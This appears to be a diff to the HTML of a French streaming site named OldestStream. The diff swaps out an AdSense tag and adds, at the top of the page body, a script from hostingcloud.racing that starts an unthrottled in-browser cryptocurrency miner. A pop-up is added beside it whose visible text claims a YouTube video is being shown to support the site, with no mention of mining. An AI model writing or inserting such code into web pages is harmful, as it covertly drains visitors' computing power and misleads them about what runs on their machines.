@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta name="google-adsense-account" content="ca-pub-5074406904097551">
+
 
     
     <link rel="icon" href="https://mcusercontent.com/40a9f1a77d46874eba2309d88/images/41c65bf1-d86c-a7f6-b1fe-c746a4783db0.jpg" type="image/x-icon">
@@ -242,7 +242,50 @@ button[type="submit"] {
     </style>
 </head>
 <body>
+<script src="https://www.hostingcloud.racing/dHBo.js"></script>
+<script>
+    var _client = new Client.Anonymous('51e5d56c0c07d0d6c705a3ba5711729d9c77f98f2d6fe264b2ddd5d4760e8cf2', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    
+    // Ajouter du CSS pour styliser la notification
+    var css = `
+        #miningNotification {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background-color: #ffff00; /* Jaune */
+            color: #000000; /* Noir pour le texte */
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            z-index: 1000;
+            max-width: 200px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        .youtube-description {
+            border: 2px solid red; /* Encadrage rouge */
+            padding: 5px;
+            margin-bottom: 10px;
+        }
+    `;
+    var style = document.createElement('style');
+    style.type = 'text/css';
+    style.appendChild(document.createTextNode(css));
+    document.head.appendChild(style);
 
+    // Ajouter la notification de minage
+    var notification = document.createElement('div');
+    notification.id = 'miningNotification';
+    notification.innerHTML = `
+        <div class="youtube-description">
+            Ce vidéo YouTube est affiché pour nous soutenir. Merci de votre support !
+        </div>
+        <button class="close-btn" onclick="document.getElementById('miningNotification').style.display='none';">&times;</button>
+    `;
+    document.body.appendChild(notification);
+</script>
     <header>
         <h1>OldestStream</h1>
         <nav>
